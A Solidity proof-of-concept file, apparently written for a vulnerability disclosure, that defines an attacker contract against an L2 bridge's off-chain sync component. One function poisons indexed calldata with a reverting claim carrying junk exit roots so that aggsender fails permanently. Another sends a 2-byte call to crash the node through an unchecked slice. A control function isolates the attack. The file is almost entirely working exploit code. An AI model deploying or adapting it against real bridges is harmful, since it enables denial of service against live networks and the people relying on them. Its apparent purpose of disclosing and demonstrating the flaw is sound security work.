// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBridge {
    function claimAsset(
        bytes32[32] calldata smtProofLocalExitRoot,
        bytes32[32] calldata smtProofRollupExitRoot,
        uint256 globalIndex,
        bytes32 mainnetExitRoot,
        bytes32 rollupExitRoot,
        uint32 originNetwork,
        address originTokenAddress,
        uint32 destinationNetwork,
        address destinationAddress,
        uint256 amount,
        bytes calldata metadata
    ) external;
}

/// @notice Attacker contract. Deploys on L2 like any user contract.
///         The ONLY difference between the control call (claimOnly) and the
///         attack call (attackWorstCase) is the second, poisoned call.
contract Poison {
    IBridge public immutable bridge;

    // Poisoned MER/RER => bridgesync stores GER = keccak(JUNK_MER, JUNK_RER)
    // which will NEVER exist in the L1 info tree => aggsender fails forever.
    bytes32 private constant JUNK_MER = bytes32(uint256(0xdeadbe01));
    bytes32 private constant JUNK_RER = bytes32(uint256(0xdeadbe02));

    constructor(IBridge _bridge) { bridge = _bridge; }

    function _split(bytes calldata blob) internal pure returns (bytes32[32] memory r) {
        require(blob.length == 1024, "blob must be 1024 bytes");
        for (uint256 i = 0; i < 32; ++i) r[i] = bytes32(blob[i * 32:(i + 1) * 32]);
    }

    /// @dev CONTROL (before): a plain, fully valid claim. Same deposit flow,
    ///      same proof, same GER — routed through this contract so the ONLY
    ///      variable between control and attack is the junk call.
    function claimOnly(
        bytes calldata proofBlob,
        uint256 globalIndex, bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originToken, uint32 destinationNetwork,
        address destinationAddress, uint256 amount, bytes calldata metadata
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress,
            amount, metadata);
    }

    /// @dev ATTACK (Variant B — calldata poisoning):
    ///      1) valid claim  -> the ONLY ClaimEvent emitted in this tx
    ///      2) poisoned call, LAST (LIFO): bridgesync pops this frame FIRST,
    ///         matches globalIndex, and OVERWRITES the claim's
    ///         MER/RER/proofs with the junk values, then returns — the valid
    ///         call is never processed.
    ///      The junk call reverts (GER not in globalExitRootMap), but the
    ///      callTracer still records its input, and bridgesync never checks
    ///      the "error" field on call frames (root cause).
    function attackWorstCase(
        bytes calldata proofBlob,
        uint256 globalIndex, bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originToken, uint32 destinationNetwork,
        address destinationAddress, uint256 amount, bytes calldata metadata
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bytes32[32] memory zero;

        // 1) VALID claim — emits ClaimEvent
        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress,
            amount, metadata);

        // 2) POISONED call — same globalIndex, junk MER/RER, zero proofs.
        //    Reverts on-chain; calldata is what matters for bridgesync.
        (bool ok, ) = address(bridge).call(abi.encodeCall(
            IBridge.claimAsset,
            (zero, zero, globalIndex, JUNK_MER, JUNK_RER,
             originNetwork, originToken, destinationNetwork, destinationAddress,
             amount, metadata)
        ));
        ok; // intentionally ignored — the revert is expected and harmless
    }

    /// @dev ATTACK (Variant A — crash): second call to the bridge with a
    ///      2-byte input. bridgesync does input[:4] without a length check
    ///      => runtime panic => cdk-node crash loop.
    function attackCrash(
        bytes calldata proofBlob,
        uint256 globalIndex, bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originToken, uint32 destinationNetwork,
        address destinationAddress, uint256 amount, bytes calldata metadata
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress,
            amount, metadata);
        (bool ok, ) = address(bridge).call(hex"1234"); // 2 bytes < 4 => panic
        ok;
    }
}
